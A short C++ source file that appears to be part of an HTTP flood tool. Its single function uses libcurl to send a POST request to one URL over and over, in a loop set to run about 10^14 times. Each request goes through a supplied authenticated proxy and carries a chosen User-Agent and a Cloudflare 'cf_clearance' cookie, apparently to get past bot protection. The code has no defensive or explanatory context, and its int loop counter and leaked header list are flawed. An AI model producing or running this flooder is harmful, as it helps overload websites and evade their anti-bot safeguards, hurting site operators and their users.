#include <stdio.h>
#include <curl/curl.h>
#include <format>
#include <string>
#include <iostream>
#include "mainFuncs.h"

void cfPost(const std::string& url, const std::string& proxy, const std::string& proxyAuth, const std::string& ua, const std::string& cookie, const std::string& parmetr)
{
    CURL* curl;
    CURLcode res;

   
    curl_global_init(CURL_GLOBAL_ALL);

  
    curl = curl_easy_init();
    if (curl) {
        for (int i = 0; i < 99999999999999; i++) {
            struct curl_slist* headers = NULL;

            headers = curl_slist_append(headers, std::format("User-Agent: {}", ua).c_str());
            headers = curl_slist_append(headers, std::format("Cookie: cf_clearance={}", cookie).c_str());


            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
            curl_easy_setopt(curl, CURLOPT_PROXYUSERPWD, proxyAuth.c_str());


            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, parmetr.c_str());
            res = curl_easy_perform(curl);

         
            if (res != CURLE_OK)
                fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
            
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            if (response_code != 200)
                std::cout << "Bad: " << response_code << std::endl;
              
        }
        
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        
    }
   
}
